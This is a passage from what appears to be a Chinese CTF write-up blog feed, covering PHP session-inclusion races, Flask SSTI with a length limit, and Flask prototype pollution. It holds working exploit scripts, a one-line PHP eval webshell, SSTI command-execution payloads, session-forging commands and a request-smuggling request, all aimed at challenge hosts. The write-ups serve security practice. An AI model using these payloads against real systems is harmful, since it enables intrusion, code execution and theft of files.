class="title function_">write</span>(<span class="params">session</span>):                          <span class="comment">#打入session文件</span></span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line">        f=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">        r=session.post(</span><br><span class="line">            url=url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;feii.txt&#x27;</span>,f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):                          <span class="comment">#读取session文件进行条件竞争</span></span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line"></span><br><span class="line">        r=session.get(url=url, params = &#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/sess_flag&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;feii.txt&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 成功写入！响应：&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 继续尝试...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> sess:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(sess,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(sess,)).start()</span><br></pre></td></tr></table></figure><p>先试了最简单的phpinfo，直接就拿到了flag，然后disable_functions把命令执行的函数都给ban了！我用scandir扫描了目录&#x2F;var&#x2F;log&#x2F;下没有nginx但是有个apache2这就不懂了，然后又试了&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log，这里面好像没内容</p><p>最后发现还可以这样写马，利用fputs和fopen</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="built_in">$</span><span class="built_in">_</span>POST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后用蚁剑的插件绕过一下就好了</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> session包含 </tag>
            
            <tag> php写马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSBCTF单身杯2024</title>
      <link href="/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"/>
      <url>/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/</url>
      
        <content type="html"><![CDATA[<h2 id="签到·好玩的PHP"><a href="#签到·好玩的PHP" class="headerlink" title="签到·好玩的PHP"></a>签到·好玩的PHP</h2><p>小考点：数字123和字符串123的md5是一样的，但是强比较不一样</p><h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><p>ssti有长度限制</p><p>利用<code>config</code>是字典的子类，我们可以使用update方法将我们要写的payload给储存到config里面，然后再取出来</p><p>目标：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">%set x=config.update(a=lipsum.__globals__)%&#125;#长度太长了</span></span><br><span class="line">可以先把config.update给存一下</span><br><span class="line">&#123;<span class="comment">%set x=config.update(a=config.update)%&#125;</span></span><br><span class="line">&#123;<span class="comment">%set x=config.a(b=lipsum.__globals__)%&#125;</span></span><br><span class="line">&#123;&#123;config.b.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到flag</p><h2 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h2><p>注册进去</p><p><img src="/../images/achieve/2025/11/image-20251129185509255.png" alt="image-20251129185509255"></p><p><img src="/../images/achieve/2025/11/image-20251129185541908.png" alt="image-20251129185541908"></p><p>提示说利用注册去进行原型链污染，而且提到了身份，我们看看cookie</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdzUsKhDAQANGrhF4biPmM4lmE0GpnzCIJpBUR8e46U4u3rQtoXotPxIxfggHOsleBmQ-qIrL4147bvAVey3GpT6fIYC9t6PBlWmRvrZKatDPBOQra3GOGBiJ7XFLMMKgGdqaaMf0GrTZwP<span class="built_in">_</span>zzJOE.aSrQ5w.ktXLaj3P75GzmyN1QiItSA52NcI</span><br></pre></td></tr></table></figure><p>这里是session，大抵就是flask的session伪造了，密钥提示我们去污染<code>app.config.SECRET_KEY</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://2ee11bb0-05f6-4dda-865c-21b1c010b233.challenge.ctf.show/register&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;SECRET_KEY&quot;</span>:<span class="string">&quot;rufeii&quot;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,json=payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>然后就是伪造session</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;is<span class="built_in">_</span>admin&#x27;: 1, &#x27;username&#x27;: &#x27;1&#x27;&#125;&quot; --secret &#x27;rufeii&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/11/image-20251129191712309.png" alt="image-20251129191712309"></p><p>之后就是ssti不需要<code>&#123;&#123;&#125;&#125;</code>，应该就过滤了点关键字很好打</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;nl /f*&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>污染的时候直接尝试污染静态目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3b889b74-472b-4490-8994-17e02fe934b1.challenge.ctf.show/register&quot;</span></span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>最后我把源码拿了一下&#x2F;var&#x2F;www&#x2F;html&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, session, request, redirect, url_for, render_template, render_template_string, jsonify</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> waf, key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置SECRET_KEY</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;ctfshow5201314&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line">valid_urls = [<span class="string">&#x27;/logout&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/echo&#x27;</span>, <span class="string">&#x27;/secret&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>, <span class="string">&#x27;/chat&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.is_admin = <span class="number">0</span>  <span class="comment"># 也可以设置默认的 is_admin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器用于验证 URL</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">require_valid_url</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.path <span class="keyword">not</span> <span class="keyword">in</span> valid_urls:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Access denied&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    wrapper.__name__ = f.__name__  <span class="comment"># 保持视图函数名称</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:  <span class="comment"># 处理 JSON 请求</span></span><br><span class="line">            username = request.json.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">            password = request.json.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username already exists&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            ctfer = CTFer(username, password)</span><br><span class="line">            merge(request.json, ctfer)</span><br><span class="line">            users[ctfer.username] = &#123;<span class="string">&#x27;password&#x27;</span>: ctfer.password, <span class="string">&#x27;is_admin&#x27;</span>: ctfer.is_admin&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Yeah~ You succeeded!&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理表单请求</span></span><br><span class="line">        data = request.form.to_dict(flat=<span class="literal">False</span>)</span><br><span class="line">        username = data.get(<span class="string">&#x27;username&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">        password = data.get(<span class="string">&#x27;password&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Username already exists&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;is_admin&#x27;</span>] = users[username][<span class="string">&#x27;is_admin&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid credentials&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;is_admin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chat&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chat</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;chat.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            secret_content = file.read()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;secret.html&#x27;</span>, secret_content=secret_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;access_denied.html&#x27;</span>), <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/echo&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>():</span><br><span class="line">    message = request.form.get(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">    session[<span class="string">&#x27;echo_message&#x27;</span>] = message</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> key(message):</span><br><span class="line">            <span class="keyword">if</span> waf(message):</span><br><span class="line">                template = <span class="string">&#x27;your answer is &#123;&#123;%s&#125;&#125;&#x27;</span> % session[<span class="string">&#x27;echo_message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                    session[<span class="string">&#x27;echo_message&#x27;</span>] = render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;echo_message&#x27;</span>] = <span class="string">&#x27;You can bypass it!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="迷雾重重"><a href="#迷雾重重" class="headerlink" title="迷雾重重"></a>迷雾重重</h2><p>php的题目不是训练的重点，不想写</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti长度限制 </tag>
            
            <tag> flask原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024蜀道山</title>
      <link href="/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/"/>
      <url>/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/</url>
      
        <content type="html"><![CDATA[<p>直接开打</p><h2 id="海关警察训练平台"><a href="#海关警察训练平台" class="headerlink" title="海关警察训练平台"></a>海关警察训练平台</h2><p>hint:</p><p>这是一个海关警察训练平台，你的任务是判断所给图片能否进入境内，但是全部判断正确的成功页面好像丢失了？？flag在内网的<a href="http://infernityhost/flag.html">http://infernityhost/flag.html</a></p><p>网页源码拿&#x2F;error路由，直接访问有重定向，抓包发现nginx&#x2F;1.17.6，上网找到</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/null1433/p/12778026.html</span><br></pre></td></tr></table></figure><p>请求走私，改下host</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.htm; HTTP/1.1</span><br><span class="line">Host: inferbityhost</span><br></pre></td></tr></table></figure><h2 id="my-site"><a href="#my-site" class="headerlink" title="my_site"></a>my_site</h2><p>给出源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 